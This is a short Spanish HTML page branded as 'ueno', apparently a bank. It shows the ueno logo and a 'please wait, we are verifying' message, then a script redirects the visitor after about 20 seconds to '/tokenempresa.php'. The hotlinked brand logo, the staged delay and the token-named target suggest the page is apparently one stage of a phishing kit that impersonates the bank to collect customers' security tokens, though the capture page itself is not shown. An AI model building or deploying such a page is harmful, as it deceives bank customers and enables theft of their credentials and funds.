<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="img/favicon.png" type="image/png">

    <title>	ueno </title>
    <style>
        body {
            background-color: #ffffff; /* Fondo gris */
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        #logo {
            width: 320px; /* Ajusta el tamaño de tu logo */
        }
        #mensaje {
            font-size: 23px;
            margin-top: 20px;
            font-family: Arial, Helvetica, sans-serif;
            font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
            color: rgb(104, 104, 104);
        }
    </style>
</head>
<body>
    <img src="https://certificaciones.greatplacetowork.com.py/hubfs/Logo_ueno.png" width="200" style="margin-bottom: 10%;" alt="">
    <img id="logo" src="https://i.pinimg.com/originals/a6/ec/56/a6ec563bcc7bfe131ea1976cb17b4915.gif" width="300" alt="Logo">
    <p id="mensaje">Espere un momento estamos verificando<span id="dots">...</span></p>

    <script>
        // Función para cambiar el mensaje después de 7 segundos
        setTimeout(function () {
            document.getElementById("mensaje").textContent = "Espere un momento estamos verificando";
            
            // Función para redirigir después de 6 segundos adicionales
            setTimeout(function () {
                window.location.href = "/tokenempresa.php"; // Cambia "otra_pagina.html" por la URL de la siguiente página
            }, 10000);
        }, 10000);

        // Función para hacer que los tres puntos titilen
        function titilarPuntos() {
            var dots = document.getElementById("dots");
            setInterval(function () {
                dots.style.visibility = (dots.style.visibility === 'hidden') ? 'visible' : 'hidden';
            }, 500);
        }

        // Llama a la función para titilar los puntos
        titilarPuntos();
    </script>
</body>
</html>
